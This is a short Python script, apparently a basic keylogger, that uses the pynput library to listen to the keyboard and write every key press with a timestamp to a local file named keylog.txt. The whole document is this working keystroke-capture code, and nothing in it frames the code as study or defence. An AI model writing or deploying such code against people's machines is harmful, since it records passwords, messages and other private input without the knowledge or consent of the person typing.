from pynput.keyboard import Key, Listener
import logging #importing required libraries
   
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 #basic log configuration 
def on_press(key):
    logging.info(str(key)) #function definition
      
with Listener(on_press=on_press) as listener :
    listener.join()   #getting key strokes 
